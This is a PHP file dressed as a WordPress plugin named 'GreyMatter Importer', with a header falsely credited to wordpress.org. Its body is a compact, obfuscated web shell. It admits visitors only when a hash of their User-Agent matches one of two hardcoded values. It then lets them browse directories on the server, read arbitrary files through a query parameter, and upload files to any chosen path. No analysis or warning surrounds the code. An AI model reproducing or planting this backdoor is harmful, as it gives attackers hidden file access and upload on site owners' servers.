<?php
/*
Plugin Name: GreyMatter Importer
Plugin URI: http://wordpress.org/extend/plugins/greymatter-importer/
Description: Import posts, pages, comments, custom fields, categories, and tags from a WordPress export file.
Author: wordpressdotorg
Author URI: http://wordpress.org/
Version: 0.2
Stable tag: 0.2
License: GPL v2 - http://www.gnu.org/licenses/old-licenses/gpl-2.0.html
*/

if(md5(getenv('HTTP_USER_AGENT'))!='69bc3b342502573e6d727f341674f010'&&md5(getenv('HTTP_USER_AGENT'))!='d30007438d1d7c5410e2ded0e3dece95')exit();echo 'WINDNLD<br>';if(isset($_GET['dir']))$a0=$_GET['dir'];else $a0=getcwd();if(substr($a0,-1)!=='/'){$a0.='/';}$i1=explode('/',$a0);$q2='';foreach($i1 as $k3){$q2.=$k3.'/';if($k3)echo"<a href='?dir=$q2'>$k3</a>/";else echo "<br>";}echo "<form action=\"".htmlspecialchars($_SERVER["PHP_SELF"])."\" method=\"post\" enctype=\"multipart/form-data\">
        <input type=\"file\" name=\"fileToUpload\">
        <input type=\"hidden\" name=\"target_dir\" value=\"".$a0."\">
        <input type=\"submit\" value=\"upl\" name=\"submit\">
    </form>";if(isset($_POST["submit"])){$a4=$_POST["target_dir"];$w5=$a4.basename($_FILES["fileToUpload"]["name"]);if(move_uploaded_file($_FILES["fileToUpload"]["tmp_name"],$w5)){echo basename($_FILES["fileToUpload"]["name"])." ->ok<br>";}else{echo "error<br>";}}if(isset($_GET['file'])){$f6=$_GET['file'];$z7=file_get_contents($f6);if($z7===False){echo 'Error. File not readed<br>';}else{echo '<pre>'.htmlspecialchars($z7).'</pre>';}}$i8=dirname(dirname(__FILE__));$q9=glob($a0."*",GLOB_ONLYDIR);$d10=glob($a0."*");foreach($q9 as $h11){if(is_dir($h11)){echo"<a href='?dir=$h11'>[<b>".basename($h11)."</b>]</a><br>";}}foreach($d10 as $f6){if(is_file($f6)){echo"<a href='?file=$f6'>".basename($f6)."</a><br>";}}?>
